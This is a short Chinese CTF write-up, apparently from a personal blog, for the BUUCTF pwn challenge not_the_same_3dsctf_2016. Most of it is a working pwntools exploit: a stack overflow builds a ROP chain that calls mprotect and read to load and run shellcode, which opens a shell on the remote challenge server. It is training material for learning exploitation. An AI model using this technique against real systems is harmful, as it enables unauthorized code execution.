---
title: "BUUCTF Pwn Not_the_same_3dsctf_2016"
date: 2020-02-18T14:07:23+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# not_the_same_3dsctf_2016

本题原本是个简单的栈溢出，因为buu环境问题只能利用其它方法，与get_started_3dsctf_2016解法相同

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-

from pwn import *
elf = ELF('./not_the_same_3dsctf_2016')
sh = remote('node3.buuoj.cn',28777)

pop3_ret = 0x0804f420#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参
				     #ROPgadget --binary get_started --only 'pop|ret' | grep pop
#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.

mem_addr = 0x80eb000 #可读可写的内存,但不可执行
mem_size = 0x1000    #通过调试出来的值
mem_proc = 0x7       #可代表可读可写可执行

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']

'''
为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.
'''
payload = 'A' * 45 #填充数据覆盖到ebp
payload += p32(mprotect_addr) #栈返回到mprotect()函数执行
payload += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12

#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)
payload += p32(mem_addr)   #mprotect函数参数1 修改的内存地址
payload += p32(mem_size)   #mprotect函数参数2 修改的内存大小
payload += p32(mem_proc)   #mprotect函数参数3 修改的权限

payload += p32(read_addr) #执行完pop3_ret后弹到read地址
payload += p32(pop3_ret)  #执行完read后将返回到pop3_ret指令,又继续使esp+12

#read 的三个参数 read(0,0x080ea000,0x100)
payload += p32(0)     #read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址
payload += p32(mem_addr)   #读取到的内容复制到指向的内存里
payload += p32(0x100) #读取大小

payload += p32(mem_addr)   #执行完read后ret esi，这里是返回到我们布置的shellcode执行

sh.sendline(payload)
payload_shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 

sh.sendline(payload_shellcode)
sh.interactive()
```

